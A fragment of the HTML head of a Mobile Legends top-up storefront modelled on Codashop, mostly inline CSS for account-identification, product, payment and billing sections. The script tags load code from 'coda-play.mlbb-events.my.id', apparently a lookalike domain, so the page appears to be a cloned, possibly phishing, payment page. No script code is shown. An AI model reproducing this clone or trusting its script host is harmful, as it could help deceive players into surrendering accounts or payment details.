in-width:992px){.user-identification__tooltip-image[data-v-83fcbcf1]{max-height:640px;padding:0}}.user-identification__tooltip-close[data-v-83fcbcf1]{width:28px;--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}@media(min-width:992px){.user-identification__tooltip-close[data-v-83fcbcf1]{display:none}}.user-identification__instructions-container[data-v-83fcbcf1]{margin-top:4px}.user-identification__instructions[data-v-83fcbcf1]{font-size:12px;line-height:1rem;overflow-wrap:break-word;--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.user-identification__instructions[data-v-83fcbcf1] a{--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1));text-decoration-line:underline}.left-parenthesis[data-v-83fcbcf1]:where([dir=ltr],[dir=ltr] *):before{--tw-content:"(";content:var(--tw-content)}.left-parenthesis[data-v-83fcbcf1]:where([dir=rtl],[dir=rtl] *):before{--tw-content:")";content:var(--tw-content)}.right-parenthesis[data-v-83fcbcf1]:where([dir=ltr],[dir=ltr] *):before{--tw-content:")";content:var(--tw-content)}.right-parenthesis[data-v-83fcbcf1]:where([dir=rtl],[dir=rtl] *):before{--tw-content:"(";content:var(--tw-content)}</style>
      <style>.user-identification[data-v-26ab9649]{position:relative}.user-identification__oauth-success[data-v-26ab9649]{display:flex;gap:.5rem;margin-bottom:.5rem;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.user-identification__oauth-success__icon[data-v-26ab9649]{fill:#ff7f98;width:24px}.user-identification__oauth-success__text[data-v-26ab9649]{display:flex;gap:.5rem}.user-identification__fields-container[data-v-26ab9649]{align-items:center;display:flex;gap:.25rem}.user-identification__fields[data-v-26ab9649]{display:grid;gap:.25rem;grid-template-columns:repeat(2,minmax(0,1fr));width:100%}@media(min-width:768px){.user-identification__fields[data-v-26ab9649]{grid-template-columns:repeat(2,1fr)}}.user-identification__fields>.user-identification__fields__field[data-v-26ab9649]:nth-child(odd):last-of-type{grid-column:1/-1}.user-identification__fields__field[data-v-26ab9649]{min-width:44%;width:100%}@media(min-width:768px){.user-identification__fields__field[data-v-26ab9649]{max-width:100%}}.user-identification__tooltip-container[data-v-26ab9649]{flex-shrink:0;grid-column:-1;grid-row:1;margin:auto}.user-identification__tooltip-icon[data-v-26ab9649]{display:inline-block;height:100%;padding-top:12px;width:24px}.user-identification__tooltip[data-v-26ab9649]{cursor:pointer;fill:#522be3;position:relative;width:24px}.user-identification__tooltip__backdrop[data-v-26ab9649]{align-items:center;background-color:#000000e6;display:flex;flex-direction:column;height:100vh;inset:0;position:fixed;z-index:50}@media(min-width:992px){.user-identification__tooltip__backdrop[data-v-26ab9649]{background-color:transparent;inset:auto;inset-inline-start:0;position:absolute}}.user-identification__tooltip-image[data-v-26ab9649]{max-height:90vh;-o-object-fit:scale-down;object-fit:scale-down;padding:16px}@media(min-width:992px){.user-identification__tooltip-image[data-v-26ab9649]{max-height:640px;padding:0}}.user-identification__tooltip-close[data-v-26ab9649]{width:28px;--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}@media(min-width:992px){.user-identification__tooltip-close[data-v-26ab9649]{display:none}}.user-identification__instructions-container[data-v-26ab9649]{margin-top:4px}.user-identification__instructions[data-v-26ab9649]{font-size:12px;line-height:1rem;overflow-wrap:break-word;--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.user-identification__instructions[data-v-26ab9649] a{--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1));text-decoration-line:underline}.left-parenthesis[data-v-26ab9649]:where([dir=ltr],[dir=ltr] *):before{--tw-content:"(";content:var(--tw-content)}.left-parenthesis[data-v-26ab9649]:where([dir=rtl],[dir=rtl] *):before{--tw-content:")";content:var(--tw-content)}.right-parenthesis[data-v-26ab9649]:where([dir=ltr],[dir=ltr] *):before{--tw-content:")";content:var(--tw-content)}.right-parenthesis[data-v-26ab9649]:where([dir=rtl],[dir=rtl] *):before{--tw-content:"(";content:var(--tw-content)}</style>
      <style>.sku-list[data-v-459ee809]{align-items:stretch;-moz-column-gap:8px;column-gap:8px;display:grid;grid-template-columns:repeat(2,minmax(0,1fr));row-gap:2px}@media(min-width:768px){.sku-list[data-v-459ee809]{grid-template-columns:repeat(auto-fill,minmax(134px,1fr))}}.sku-list-v2[data-v-459ee809]{row-gap:14px}.sku-list__title[data-v-459ee809]{color:rgb(63 60 77/var(--tw-text-opacity,1));line-height:24px;margin-bottom:10px}.sku-list__category-name[data-v-459ee809],.sku-list__title[data-v-459ee809]{font-weight:600;--tw-text-opacity:1}.sku-list__category-name[data-v-459ee809]{color:rgb(47 18 54/var(--tw-text-opacity,1));font-size:12px;line-height:150%;margin-bottom:.5rem}</style>
      <style>.category__banner[data-v-145a1ac1]{align-items:center;border-radius:8px;border-style:solid;border-width:1px;-moz-column-gap:.25rem;column-gap:.25rem;display:flex;margin-bottom:12px;--tw-border-opacity:1;border-color:rgb(234 232 247/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(246 245 252/var(--tw-bg-opacity,1));padding:.5rem}.category__banner-image[data-v-145a1ac1]{max-height:2.25rem;max-width:2.5rem;width:100%}.category__banner-image img[data-v-145a1ac1]{max-width:100%}.category__banner__content[data-v-145a1ac1]{display:flex;flex-direction:column}.category__banner__content-title[data-v-145a1ac1]{font-size:16px;font-weight:600;line-height:130%;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}.category__banner__content-description[data-v-145a1ac1]{display:-webkit-box;font-size:12px;font-weight:400;line-height:150%;overflow:hidden;-webkit-box-orient:vertical;-webkit-line-clamp:2;--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}.category__info__header[data-v-145a1ac1]{align-items:center;display:flex;justify-content:space-between;width:100%}.category__info__header-title[data-v-145a1ac1]{font-size:18px;font-weight:700;letter-spacing:0}.category__info__content[data-v-145a1ac1]{align-items:center;display:flex;flex-direction:column;padding:1rem}.category__info__content-image[data-v-145a1ac1]{margin-bottom:3rem;max-width:88px}.category__info__content-image img[data-v-145a1ac1]{max-width:100%}.category__info__content-description[data-v-145a1ac1]{font-size:14px;font-weight:400;line-height:150%}.category__info__footer[data-v-145a1ac1]{--tw-bg-opacity:1;background-color:rgb(247 237 250/var(--tw-bg-opacity,1));padding:1rem 1rem 1.5rem}</style>
      <style>.sku-card[data-v-b6e2aaf7]{cursor:pointer;direction:ltr;height:100%;list-style-type:none;margin:0;padding:10px 0 0;position:relative}.sku-card__inner-container[data-v-b6e2aaf7]{border-radius:1em;border-style:solid;border-width:2px;box-sizing:border-box;flex-direction:column;gap:.5em;overflow:hidden;position:relative;--tw-border-opacity:1;border-color:rgb(232 227 255/var(--tw-border-opacity,1))}.sku-card__inner-container[data-v-b6e2aaf7],.sku-card__not-available[data-v-b6e2aaf7]{display:flex;height:100%;--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1))}.sku-card__not-available[data-v-b6e2aaf7]{align-items:center;justify-content:center;position:absolute;width:100%;--tw-text-opacity:1;color:rgb(224 73 113/var(--tw-text-opacity,1))}.sku-card--selected[data-v-b6e2aaf7]{--tw-border-opacity:1;border-color:rgb(82 43 227/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(217 209 255/var(--tw-bg-opacity,1))}.sku-card--popular[data-v-b6e2aaf7]{animation:shimmer-b6e2aaf7 2.5s ease-in-out infinite alternate;background:linear-gradient(#fff,#fff) padding-box,linear-gradient(135deg,#e04971,#ff7f98 12.5%,#feffde,#6242fc,#522be3,#6242fc,#feffde,#ff7f98 87.5%,#e04971) border-box;background-size:300%;border-color:transparent;border-start-start-radius:0}.sku-card--popular.sku-card--selected[data-v-b6e2aaf7]{--tw-border-opacity:1;background:#d9d1ff;border-color:rgb(82 43 227/var(--tw-border-opacity,1))}.sku-card--sale[data-v-b6e2aaf7]{background-position:-175%;background-repeat:repeat;background-size:300%;-webkit-mask:linear-gradient(135deg,#000 40%,rgba(0,0,0,.333),#000 60%) right/400%;mask:linear-gradient(135deg,#000 40%,rgba(0,0,0,.333),#000 60%) right/400%;--tw-border-opacity:1;border-color:rgb(255 239 214/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1))}.sku-card--sale .price-section[data-v-b6e2aaf7]{--tw-bg-opacity:1;background-color:rgb(255 249 241/var(--tw-bg-opacity,1))}.sku-card--sale.sku-card--selected[data-v-b6e2aaf7]{--tw-border-opacity:1;border-color:rgb(253 179 62/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(255 230 187/var(--tw-bg-opacity,1))}@keyframes shimmer-b6e2aaf7{0%{background-position:0 0}to{background-position:100% 100%}}.sku-card--popular.sku-card--sale[data-v-b6e2aaf7]{animation:shimmer-b6e2aaf7 2.5s ease-in-out infinite alternate;background-image:linear-gradient(#fff9f1,#fff9f1) padding-box,linear-gradient(135deg,#ffe6bb 30%,#fdb33e,#ffe6bb 70%) border-box;background-size:300%;border-color:transparent}.sku-card--popular.sku-card--sale.sku-card--selected[data-v-b6e2aaf7]{--tw-border-opacity:1;border-color:rgb(253 179 62/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(255 230 187/var(--tw-bg-opacity,1))}.sku-card--disabled[data-v-b6e2aaf7]{cursor:not-allowed;--tw-text-opacity:1;color:rgb(185 174 197/var(--tw-text-opacity,1));opacity:.5;--tw-grayscale:grayscale(100%);filter:var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)}.sku-card--limit[data-v-b6e2aaf7]{cursor:not-allowed}.sku-card--disabled.sku-card--sale[data-v-b6e2aaf7]{animation:none}.sku-card--disabled[data-v-b6e2aaf7]{animation:none;border-radius:1em;--tw-border-opacity:1;border-color:rgb(217 209 255/var(--tw-border-opacity,1))}.sku-card__tag[data-v-b6e2aaf7]{inset-inline-start:0;position:absolute;top:0}.sku-card__inner-container .flash-sale-tag[data-v-b6e2aaf7]{inset-inline-end:0;position:absolute;top:0}.sku-info-section[data-v-b6e2aaf7]{align-items:center;flex:1 0 auto;gap:4px;margin:20px 6px 8px;text-align:center;width:auto}.sku-info-section[data-v-b6e2aaf7],.sku-info-section__titles[data-v-b6e2aaf7]{display:flex;flex-direction:column}.sku-info-section__titles__title[data-v-b6e2aaf7]{font-size:16px;font-weight:600;line-height:20px;text-align:center;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1));overflow-wrap:anywhere}.sku-info-section__titles__icon[data-v-b6e2aaf7]{display:inline-block;height:16px;margin-left:2px;width:16px;--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1))}.sku-info-section__titles__sub-title[data-v-b6e2aaf7]{align-items:center;display:flex;font-size:10px;font-weight:600;gap:4px;justify-content:center;line-height:12px;margin-top:2px;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}.sku-info-section__images[data-v-b6e2aaf7]{align-items:center;display:flex;gap:8px;height:48px;margin-top:auto}.sku-info-section__images__icon[data-v-b6e2aaf7]{display:flex;flex:0 1 auto;height:100%;justify-content:center;overflow:hidden;width:100%}.sku-info-section__images__icon img[data-v-b6e2aaf7]{height:100%;-o-object-fit:contain;object-fit:contain;width:auto}.sku-info-section__images__percentage-tag[data-v-b6e2aaf7]{flex:0 1 auto}.sku-info-section .bonus-desc[data-v-b6e2aaf7]{font-size:10px;font-weight:600;line-height:12px;--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}.price-section[data-v-b6e2aaf7]{align-items:flex-end;display:flex;flex:0;flex-direction:column;gap:4px;height:100%;justify-content:flex-start;--tw-bg-opacity:1;background-color:rgb(246 245 252/var(--tw-bg-opacity,1));font-size:10px;padding:8px;text-align:right}.price-section--hidden[data-v-b6e2aaf7]{visibility:hidden}.price-section__price[data-v-b6e2aaf7]{align-items:flex-end;display:flex;flex-direction:column;flex-wrap:wrap;gap:4px;justify-content:flex-end}.price-section__price__prefix[data-v-b6e2aaf7]{font-size:10px;letter-spacing:0;line-height:12px;--tw-text-opacity:1;color:rgb(240 99 131/var(--tw-text-opacity,1))}.price-section__price__price-container[data-v-b6e2aaf7]{align-items:center;display:flex;gap:4px;--tw-text-opacity:1;color:rgb(240 99 131/var(--tw-text-opacity,1))}.price-section__price__price-container__discount-tag[data-v-b6e2aaf7]{border-radius:8px;margin:2px 4px;--tw-bg-opacity:1;background-color:rgb(213 247 219/var(--tw-bg-opacity,1));font-size:10px;font-weight:600;letter-spacing:0;line-height:12px;padding:2px 4px;--tw-text-opacity:1;color:rgb(8 173 54/var(--tw-text-opacity,1))}.price-section__price__price-container__amount[data-v-b6e2aaf7]{font-size:16px;font-weight:600;line-height:20px}.price-section__price__price-container__insufficient[data-v-b6e2aaf7]{font-size:10px}.sku-info-section .sale[data-v-b6e2aaf7]{background-image:linear-gradient(135.19deg,#fff9f100 -20.2%,#fff -.08%,#fff9f100 19.87%)}.sku-subtitle[data-v-b6e2aaf7]{gap:4px;line-height:12px;margin-top:2px}.sku-card__expiry-section[data-v-b6e2aaf7],.sku-subtitle[data-v-b6e2aaf7]{align-items:center;display:flex;font-size:10px;font-weight:600;justify-content:center;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}.sku-card__expiry-section[data-v-b6e2aaf7]{line-height:14px;padding:4px;text-align:center}.sku-card__expiry-section__text[data-v-b6e2aaf7]{font-size:10px;font-weight:600;line-height:14px;text-align:center;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}.expiry-section--alert[data-v-b6e2aaf7]{--tw-text-opacity:1;color:rgb(196 36 0/var(--tw-text-opacity,1))}.expiry-section--warning[data-v-b6e2aaf7]{--tw-text-opacity:1;color:rgb(247 159 47/var(--tw-text-opacity,1))}</style>
      <style>.price-section__price[data-v-1a52783c]{align-items:flex-end;display:flex;flex-direction:column;flex-wrap:wrap;gap:4px;justify-content:flex-end}.price-section__price__prefix[data-v-1a52783c]{font-size:10px;letter-spacing:0;line-height:12px}.price-section__price__prefix[data-v-1a52783c],.price-section__price__price-container[data-v-1a52783c]{--tw-text-opacity:1;color:rgb(240 99 131/var(--tw-text-opacity,1))}.price-section__price__price-container[data-v-1a52783c]{align-items:center;display:flex;gap:4px}.price-section__price__price-container__discount-tag[data-v-1a52783c]{border-radius:8px;margin:2px 4px;--tw-bg-opacity:1;background-color:rgb(213 247 219/var(--tw-bg-opacity,1));font-size:10px;font-weight:600;letter-spacing:0;line-height:12px;padding:2px 4px;--tw-text-opacity:1;color:rgb(8 173 54/var(--tw-text-opacity,1))}.price-section__price__price-container__amount[data-v-1a52783c]{font-size:16px;font-weight:600;line-height:20px}.price-section__usual-price[data-v-1a52783c]{font-size:10px;font-weight:600;line-height:16px;text-align:right;--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.price-section__usual-price__amount[data-v-1a52783c]{text-decoration-line:line-through}</style>
      <style>.best-seller-tag[data-v-dff4bb30]{align-items:center;background-image:linear-gradient(to right,var(--tw-gradient-stops));border-end-end-radius:12px;border-end-start-radius:0;border-start-end-radius:12px;border-start-start-radius:12px;-moz-column-gap:.25rem;column-gap:.25rem;display:flex;inset-inline-start:0;padding:.125rem 6px;position:absolute;top:0}.best-seller-tag[data-v-dff4bb30]:where([dir=ltr],[dir=ltr] *){--tw-gradient-from:#ff7f98 var(--tw-gradient-from-position);--tw-gradient-to:rgba(255,127,152,0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from),var(--tw-gradient-to);--tw-gradient-to:#6242fb var(--tw-gradient-to-position)}.best-seller-tag[data-v-dff4bb30]:where([dir=rtl],[dir=rtl] *){--tw-gradient-from:#6242fb var(--tw-gradient-from-position);--tw-gradient-to:rgba(98,66,251,0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from),var(--tw-gradient-to);--tw-gradient-to:#ff7f98 var(--tw-gradient-to-position)}.best-seller-tag--highlight[data-v-dff4bb30]:where([dir=ltr],[dir=ltr] *){--tw-gradient-from:#f79f2f var(--tw-gradient-from-position);--tw-gradient-to:rgba(247,159,47,0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from),var(--tw-gradient-to);--tw-gradient-to:#f06383 var(--tw-gradient-to-position)}.best-seller-tag--highlight[data-v-dff4bb30]:where([dir=rtl],[dir=rtl] *){--tw-gradient-from:#f06383 var(--tw-gradient-from-position);--tw-gradient-to:rgba(240,99,131,0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from),var(--tw-gradient-to);--tw-gradient-to:#f79f2f var(--tw-gradient-to-position)}.best-seller-tag__shimmer[data-v-dff4bb30]{height:100%;inset-inline-start:0;position:absolute;top:0;width:100%}@keyframes shimmer-dff4bb30{0%{background-position:0 0}to{background-position:100% 100%}}.best-seller-tag__shimmer[data-v-dff4bb30]{animation:shimmer-dff4bb30 2.5s linear infinite alternate;background-image:linear-gradient(135deg,#fff0 40%,#fff6,#fff0 60%);background-size:300%;border-end-end-radius:12px;border-end-start-radius:0;border-start-end-radius:12px;border-start-start-radius:12px;mix-blend-mode:overlay}.best-seller-tag__icon[data-v-dff4bb30]{display:flex;height:1rem;width:1rem}.best-seller-tag__icon[data-v-dff4bb30],.best-seller-tag__text[data-v-dff4bb30]{--tw-text-opacity:1;color:rgb(246 245 252/var(--tw-text-opacity,1))}.best-seller-tag__text[data-v-dff4bb30]{font-size:10px;font-weight:600;line-height:120%}</style>
      <style>.payment-section[data-v-d3d850d8]{display:grid;grid-template-columns:repeat(auto-fit,minmax(145px,1fr))}</style>
      <style>.payment-method[data-v-238b72ee]{border-radius:8px;border-width:1px;cursor:pointer;margin:6px 4px;position:relative;--tw-border-opacity:1;align-items:flex-start;border-color:rgb(182 179 199/var(--tw-border-opacity,1));display:flex;flex-direction:column;justify-content:space-between}.payment-method--disabled[data-v-238b72ee]{opacity:.3}.payment-method__content--default[data-v-238b72ee]{align-items:flex-start;display:flex;flex-direction:column;gap:8px;height:100%;justify-content:space-between;padding:16px 8px 12px;width:100%}.payment-method__content--default>section[data-v-238b72ee]{align-items:flex-start;display:flex;justify-content:flex-start;max-width:100%;text-align:start;width:100%}.payment-method__content--simplified[data-v-238b72ee]{align-items:flex-start;display:flex;flex-direction:column;gap:2px;height:100%;justify-content:space-between;padding:8px;width:100%}.payment-method__logo[data-v-238b72ee]{margin:0;margin-inline-end:0;max-width:100%}.payment-method__logo-img[data-v-238b72ee]{height:28px;margin-bottom:4px;max-width:80px;-o-object-fit:scale-down;object-fit:scale-down}.payment-method__logo-tagline[data-v-238b72ee]{font-size:12px;font-weight:400;line-height:150%;overflow-wrap:break-word;--tw-text-opacity:1;color:rgb(0 0 0/var(--tw-text-opacity,1))}.payment-method--selected[data-v-238b72ee]{border-width:2px;--tw-border-opacity:1;border-color:rgb(82 43 227/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(217 209 255/var(--tw-bg-opacity,1))}.payment-method__pricing[data-v-238b72ee]{display:flex;flex-direction:column;justify-content:flex-end}.payment-method__pricing__info[data-v-238b72ee]{align-items:center;display:flex;flex-wrap:nowrap}.payment-method__price--discount[data-v-238b72ee]{border-radius:8px;margin-inline-end:4px;--tw-bg-opacity:1;background-color:rgb(213 247 219/var(--tw-bg-opacity,1));color:rgb(35 173 83/var(--tw-text-opacity,1));padding:2px 4px}.payment-method__price--discount[data-v-238b72ee],.payment-method__price--strikethrough[data-v-238b72ee]{font-size:10px;font-weight:600;line-height:120%;--tw-text-opacity:1}.payment-method__price--strikethrough[data-v-238b72ee]{color:rgb(145 141 161/var(--tw-text-opacity,1));text-decoration-line:line-through}.payment-method__price[data-v-238b72ee]{align-items:center;display:flex;font-size:16px;font-weight:600;gap:4px;line-height:130%;--tw-text-opacity:1;color:rgb(240 99 131/var(--tw-text-opacity,1))}.payment-method__footer[data-v-238b72ee]{border-style:solid;border-top-width:1px;max-width:100%;overflow-wrap:break-word;--tw-border-opacity:1;border-color:rgb(182 179 199/var(--tw-border-opacity,1));padding:2px 8px}.payment-method__footer-note[data-v-238b72ee]{font-size:10px;font-weight:600;line-height:120%;--tw-text-opacity:1;color:rgb(0 0 0/var(--tw-text-opacity,1))}.payment-method__pricing__disabled[data-v-238b72ee]{font-size:12px;font-weight:400;line-height:150%;text-align:end}.payment-method__pricing__disabled-message[data-v-238b72ee]{max-width:100%;overflow-wrap:break-word;--tw-text-opacity:1;color:rgb(0 0 0/var(--tw-text-opacity,1))}.payment-method__pricing__turn-off-cashback[data-v-238b72ee]{font-weight:600;--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1))}.payment-method__tag[data-v-238b72ee]{inset-inline-start:-.1rem;position:absolute;top:-.725rem}</style>
      <style>.billing-section__container .billing-section__sub-header[data-v-cbf450c6]{font-size:14px;font-weight:600;line-height:150%;margin-bottom:12px;--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}.billing-section__container .billing-section__form[data-v-cbf450c6]{display:flex;flex-wrap:wrap}.billing-section__container .billing-section__form-field[data-v-cbf450c6]{margin-bottom:.5rem}</style>
      <style>.product-long-description[data-v-c063fa34]{margin-left:auto;margin-right:auto;padding:15px}@media(min-width:768px){.product-long-description[data-v-c063fa34]{max-width:1000px;padding-bottom:30px;padding-top:0}}.product-long-description__title[data-v-c063fa34]{font-size:20px;font-weight:600;line-height:130%;margin-bottom:15px;margin-top:15px;text-align:center;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}.product-long-description__content[data-v-c063fa34]{font-size:14px;overflow-wrap:break-word;text-align:center;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}[data-v-c063fa34] .product-long-description__content p{line-height:22px;margin-bottom:15px;margin-top:15px}[data-v-c063fa34] .product-long-description__content a{--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1));text-decoration-line:underline}[data-v-c063fa34] .product-long-description__content hr{margin-bottom:15px;margin-top:15px}</style>
      <style>.product-faq-section[data-v-b133f038]{gap:15px;grid-template-columns:repeat(3,minmax(0,1fr));justify-content:space-between;margin:auto;padding:15px}@media(min-width:768px){.product-faq-section[data-v-b133f038]{display:grid;max-width:1100px}}</style>
      <style>.product-faq-item__container[data-v-2062635a]{border-radius:4px;margin-bottom:15px;overflow-wrap:break-word;width:100%;--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1));padding:20px;--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}@media(min-width:768px){.product-faq-item__container[data-v-2062635a]{margin-bottom:0}}.product-faq-item__content[data-v-2062635a]{align-items:center;display:flex;justify-content:space-between}@media(min-width:768px){.product-faq-item__content[data-v-2062635a]{display:block}}.product-faq-item__content-header[data-v-2062635a]{flex:1;font-size:18px;line-height:120%;min-width:0;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}@media(min-width:768px){.product-faq-item__content-header[data-v-2062635a]{font-size:20px;font-weight:600;line-height:130%;text-align:center}}.product-faq-item__content-header-icon[data-v-2062635a]{display:block;height:16px;width:16px}@media(min-width:768px){.product-faq-item__content-header-icon[data-v-2062635a]{display:none}}.product-faq-item__content-description[data-v-2062635a]{font-size:.875rem;margin-top:10px}@media(min-width:768px){.product-faq-item__content-description[data-v-2062635a]{display:block}}[data-v-2062635a] .product-faq-item__content-description p{margin-bottom:15px;margin-top:15px}[data-v-2062635a] .product-faq-item__content-description a{--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1));text-decoration-line:underline}[data-v-2062635a] .product-faq-item__content-description ol{list-style-type:decimal;margin-bottom:14px;margin-top:14px}[data-v-2062635a] .product-faq-item__content-description ol:dir(ltr){padding-left:32px}[data-v-2062635a] .product-faq-item__content-description ol:dir(rtl){padding-right:32px}</style>
      <link rel="stylesheet" href="css/entry.DZ_7f9mh.css">
      <link rel="stylesheet" href="css/LoadingSpinner.CNGYYImg.css">
      <link rel="stylesheet" href="css/Dialog.UuzwtdD3.css">
      <link rel="stylesheet" href="css/TrustTag.DTEznldf.css">
      <link rel="stylesheet" href="css/TextField.CLSHXHMW.css">
      <link rel="stylesheet" href="css/FieldErrorMessage.BQqnUcrH.css">
      <link rel="stylesheet" href="css/Dropdown.DEw9_vCR.css">
      <link rel="stylesheet" href="css/index.Gg40wHeJ.css">
      <link rel="stylesheet" href="css/PartnerSsoButton.gDhhFnfE.css">
      <link rel="stylesheet" href="css/PhoneNumber.CB3EKAw1.css">
      <link rel="stylesheet" href="css/Ghost.CdUd_47P.css">
      <link rel="stylesheet" href="css/Sheet.KrvcHgO_.css">
      <link rel="stylesheet" href="css/Checkbox.CApa6DZJ.css">
      <link rel="stylesheet" href="css/OrderSummarySku.BE_sKAgv.css">
      <link rel="stylesheet" href="css/ReCaptcha.Bgft6uvC.css">
      <link rel="preload" as="image" href="S/content/mobile/images/product-tiles/MLBB-2025-tiles-178x178.jpg" imagesrcset="S/content/mobile/images/product-tiles/MLBB-2025-tiles-178x178.jpg 1x, https://cdn1.codashop.com/S/content/mobile/images/product-tiles/MLBB-2025-tiles-178x178.jpg 2x">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DUg9ceFP.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/mV5Iw7pY.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DhomyZXh.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BaMOrUSd.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/TGgsNNtS.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/C4uZLPDf.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/mJdUVbDb.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/oGrX6n3G.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BSUZ5oDO.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/99QPSd8Y.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BbvGzAAT.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/JF_dVFTt.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/5V9ol110.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Du2j1qnS.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BZrL64j3.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/qxzCVVMy.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BPUUjZiB.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/kCmiYH7W.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Cs2aCBc_.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/C-mCN3Jz.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BoMKZJEc.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BPcT_8Kh.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Bdq9jlJi.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Bz0M0FRS.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BQcZn31T.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DTkY6u16.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/ClEEXtl1.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/D9e1Tn3S.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Dpfrr9_D.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CNJDN__3.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Dsqoa_lJ.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BARExk4i.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BkRd5C0Z.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/vaKcAki4.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Bbj1kxzD.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BlM1Ow8b.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/4OD7uZxB.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BtLSrBGO.js">
